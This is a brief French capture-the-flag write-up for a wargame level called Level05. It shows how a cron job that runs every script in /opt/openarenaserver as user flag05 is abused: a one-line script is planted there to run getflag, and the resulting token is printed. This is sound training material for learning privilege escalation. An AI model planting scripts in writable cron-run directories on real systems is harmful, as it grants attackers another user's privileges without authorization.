# Level05

- `cat /var/mail/level05`
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
- `cat /usr/sbin/openarenaserver`
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
- On peut voir que le crontab execute tout les fichier se trouvant dans /opt/openarenaser/ en tant que flag05
- Donc on crée un script qui execute getflag
- `echo "getflag > /tmp/flag" > /opt/openarenaserver/run; cat /tmp/flag`
```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
